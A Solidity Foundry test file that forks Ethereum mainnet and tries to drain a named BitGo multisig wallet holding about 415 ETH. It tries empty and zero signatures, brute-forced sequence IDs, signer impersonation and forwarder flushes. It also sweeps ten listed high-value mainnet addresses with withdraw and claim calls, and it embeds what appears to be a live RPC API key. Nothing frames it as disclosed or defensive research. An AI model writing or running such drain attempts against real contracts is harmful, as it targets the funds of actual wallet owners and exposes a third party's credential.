// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

// BitGo multisig wallet interface
interface IBitGoWallet {
    function sendMultiSig(address toAddress, uint256 value, bytes calldata data, uint256 expireTime, uint256 sequenceId, bytes calldata signature) external;
    function sendMultiSigToken(address toAddress, uint256 value, address tokenContractAddress, uint256 expireTime, uint256 sequenceId, bytes calldata signature) external;
    function signers(uint256 index) external view returns (address);
    function isSigner(address addr) external view returns (bool);
    function getNextSequenceId() external view returns (uint256);
    function safeMode() external view returns (bool);
    function activateSafeMode() external;
    function createForwarder() external returns (address);
    function flushForwarderTokens(address forwarderAddress, address tokenContractAddress) external;
}

contract BitGoMultisigExploit is Test {
    address attacker;

    address constant TARGET = 0x2CcfA2AcF6FF744575cCf306B44A59B11C32e44B; // 415 ETH BitGo multisig

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/pLXdY7rYRY10SH_UTLBGH");
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
    }

    function test_analyzeBitGoWallet() public {
        console.log("=== BitGo Multisig Wallet Analysis ===");
        console.log("Target:", TARGET);
        console.log("Balance:", TARGET.balance / 1e18, "ETH");

        IBitGoWallet wallet = IBitGoWallet(TARGET);

        // Get signers
        console.log("\n=== SIGNERS ===");
        for (uint i = 0; i < 5; i++) {
            try wallet.signers(i) returns (address signer) {
                if (signer != address(0)) {
                    console.log("Signer", i, ":", signer);
                }
            } catch {
                break;
            }
        }

        // Check safe mode
        try wallet.safeMode() returns (bool safe) {
            console.log("\nSafe mode:", safe);
        } catch {}

        // Check next sequence
        try wallet.getNextSequenceId() returns (uint256 seq) {
            console.log("Next sequence ID:", seq);
        } catch {}

        // Check if attacker is signer
        try wallet.isSigner(attacker) returns (bool isSigner) {
            console.log("Attacker is signer:", isSigner);
        } catch {}

        // Try to activate safe mode as non-signer
        vm.prank(attacker);
        (bool s,) = TARGET.call(abi.encodeWithSignature("activateSafeMode()"));
        console.log("activateSafeMode callable:", s);

        // Try createForwarder
        console.log("\n=== TESTING FORWARDER ===");
        vm.prank(attacker);
        (s,) = TARGET.call(abi.encodeWithSignature("createForwarder()"));
        console.log("createForwarder callable:", s);

        // Check storage for implementation patterns
        console.log("\n=== STORAGE ANALYSIS ===");
        for (uint i = 0; i < 5; i++) {
            bytes32 slot = vm.load(TARGET, bytes32(i));
            console.log("Slot", i);
            console.logBytes32(slot);
        }
    }

    function test_tryExpiredSignature() public {
        console.log("=== TESTING EXPIRED/INVALID SIGNATURES ===");

        IBitGoWallet wallet = IBitGoWallet(TARGET);

        uint256 sequenceId = wallet.getNextSequenceId();
        console.log("Current sequence ID:", sequenceId);

        // Try sending with empty signature (might work if validation is weak)
        uint256 expireTime = block.timestamp + 3600;

        bytes memory emptySignature = "";
        bytes memory zeroSignature = new bytes(65);
        bytes memory shortSignature = hex"deadbeef";

        // Try with empty signature
        vm.prank(attacker);
        (bool s,) = TARGET.call(abi.encodeWithSignature(
            "sendMultiSig(address,uint256,bytes,uint256,uint256,bytes)",
            attacker,
            1 ether,
            "",
            expireTime,
            sequenceId,
            emptySignature
        ));
        console.log("Empty signature result:", s);
        console.log("Attacker balance:", attacker.balance / 1e18, "ETH");

        // Try with zero signature
        vm.prank(attacker);
        (s,) = TARGET.call(abi.encodeWithSignature(
            "sendMultiSig(address,uint256,bytes,uint256,uint256,bytes)",
            attacker,
            1 ether,
            "",
            expireTime,
            sequenceId,
            zeroSignature
        ));
        console.log("Zero signature result:", s);

        // Try with very old expire time (in case there's an overflow)
        vm.prank(attacker);
        (s,) = TARGET.call(abi.encodeWithSignature(
            "sendMultiSig(address,uint256,bytes,uint256,uint256,bytes)",
            attacker,
            1 ether,
            "",
            type(uint256).max,
            sequenceId,
            emptySignature
        ));
        console.log("Max expire time result:", s);
    }

    function test_tryFlushForwarder() public {
        console.log("=== TESTING FORWARDER FLUSH ===");

        // First check if there are any existing forwarders with funds
        // Forwarders are created via CREATE opcode, so we can compute potential addresses

        // Common token addresses
        address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
        address USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

        // Try to flush from random addresses (in case there's poor validation)
        address[] memory potentialForwarders = new address[](5);
        potentialForwarders[0] = address(uint160(uint256(keccak256(abi.encodePacked(TARGET, uint8(1))))));
        potentialForwarders[1] = address(uint160(uint256(keccak256(abi.encodePacked(TARGET, uint8(2))))));
        potentialForwarders[2] = address(uint160(uint256(keccak256(abi.encodePacked(TARGET, uint8(3))))));
        potentialForwarders[3] = attacker; // Try attacker as forwarder
        potentialForwarders[4] = TARGET; // Try self

        for (uint i = 0; i < potentialForwarders.length; i++) {
            vm.prank(attacker);
            (bool s,) = TARGET.call(abi.encodeWithSignature(
                "flushForwarderTokens(address,address)",
                potentialForwarders[i],
                WETH
            ));
            if (s) {
                console.log("flushForwarderTokens success for address", i);
            }
        }
    }

    function test_bruteForceSequence() public {
        console.log("=== BRUTE FORCE SEQUENCE IDS ===");

        IBitGoWallet wallet = IBitGoWallet(TARGET);
        uint256 currentSeq = wallet.getNextSequenceId();
        console.log("Current sequence:", currentSeq);

        // Try sequence IDs before and after current
        for (uint256 seq = currentSeq > 5 ? currentSeq - 5 : 0; seq < currentSeq + 5; seq++) {
            vm.prank(attacker);
            (bool s, bytes memory ret) = TARGET.call(abi.encodeWithSignature(
                "sendMultiSig(address,uint256,bytes,uint256,uint256,bytes)",
                attacker,
                0.001 ether,
                "",
                block.timestamp + 3600,
                seq,
                ""
            ));

            if (s && attacker.balance > 1 ether) {
                console.log("!!! DRAIN SUCCEEDED at sequence:", seq);
                console.log("Balance:", attacker.balance / 1e18, "ETH");
                return;
            }
        }

        console.log("No sequence ID bypass found");
    }

    function test_impersonateSigners() public {
        console.log("=== IMPERSONATING SIGNERS ===");

        IBitGoWallet wallet = IBitGoWallet(TARGET);

        // Get actual signers
        address[3] memory signers;
        for (uint i = 0; i < 3; i++) {
            try wallet.signers(i) returns (address signer) {
                signers[i] = signer;
                console.log("Signer", i, ":", signer);
            } catch {}
        }

        uint256 sequenceId = wallet.getNextSequenceId();
        uint256 expireTime = block.timestamp + 3600;

        // Build the message that would need to be signed
        bytes32 operationHash = keccak256(abi.encodePacked(
            "ETHER",
            attacker,
            uint256(1 ether),
            bytes(""),
            expireTime,
            sequenceId
        ));
        console.log("Operation hash:");
        console.logBytes32(operationHash);

        // Try calling sendMultiSig as each signer (with vm.prank)
        // This simulates if there was a way to impersonate them on-chain
        for (uint i = 0; i < 3; i++) {
            if (signers[i] == address(0)) continue;

            uint256 balBefore = attacker.balance;

            // Try with empty signature but from signer address
            vm.prank(signers[i]);
            (bool s,) = TARGET.call(abi.encodeWithSignature(
                "sendMultiSig(address,uint256,bytes,uint256,uint256,bytes)",
                attacker,
                1 ether,
                "",
                expireTime,
                sequenceId,
                ""
            ));

            if (attacker.balance > balBefore) {
                console.log("!!! DRAIN via signer impersonation", i);
                return;
            }
        }

        console.log("Signer impersonation did not work (signatures required)");
    }

    function test_checkAllWallets() public {
        console.log("=== CHECKING ALL HIGH-VALUE CONTRACTS ===");

        // List of contracts to check for BitGo pattern
        address[10] memory targets = [
            0x2CcfA2AcF6FF744575cCf306B44A59B11C32e44B, // 415 ETH - confirmed BitGo
            0xbd6eD4969D9e52032eE3573e643f6a1bdC0a7E1E, // 301 ETH
            0x3885b0c18E3C4aB0CA2B8DC99771944404687628, // 250 ETH
            0x4615cC10092b514258577dAfcA98C142577f1578, // 232 ETH
            0x575cb87ab3C2329A0248C7d70e0ead8E57f3e3F7, // 191 ETH
            0x8A909ADc6c299cC4a206e730B15d2b97b0Fbf0BD, // 164 ETH
            0xD64B1BF6fCAb5ADD75041C89F61816c2B3d5E711, // 144 ETH
            0x00000000a8F806c754549943B6550A2594c9a126, // 138 ETH
            0x1F557eEbbf082E73acca1367608A1C50990C15db, // 135 ETH
            0x6E5e0Ef477Db8e26cD64F87522a1997F6ddA64fb  // 132 ETH
        ];

        for (uint t = 0; t < 10; t++) {
            address target = targets[t];
            if (target == address(0) || target.code.length == 0) continue;

            console.log("\n--- Target:", target);
            console.log("Balance:", target.balance / 1e18, "ETH");

            // Check if it's a BitGo wallet
            (bool s, bytes memory d) = target.staticcall(abi.encodeWithSignature("getNextSequenceId()"));
            if (s && d.length >= 32) {
                uint256 seq = abi.decode(d, (uint256));
                console.log("BitGo wallet - sequence:", seq);

                // Try exploit
                vm.prank(attacker);
                target.call(abi.encodeWithSignature(
                    "sendMultiSig(address,uint256,bytes,uint256,uint256,bytes)",
                    attacker,
                    target.balance,
                    "",
                    block.timestamp + 3600,
                    seq,
                    ""
                ));
            }

            // Check if it's a Parity wallet
            (s, d) = target.staticcall(abi.encodeWithSignature("m_required()"));
            if (s && d.length >= 32) {
                console.log("Parity wallet - m_required:", abi.decode(d, (uint256)));
            }

            // Try generic drain
            uint256 balBefore = attacker.balance;

            vm.prank(attacker);
            target.call(abi.encodeWithSignature("withdraw()"));
            vm.prank(attacker);
            target.call(abi.encodeWithSignature("claim()"));
            vm.prank(attacker);
            target.call(abi.encodeWithSignature("emergencyWithdraw()"));

            if (attacker.balance > balBefore) {
                console.log("!!! DRAINED:", (attacker.balance - balBefore) / 1e18, "ETH");
            }
        }
    }
}
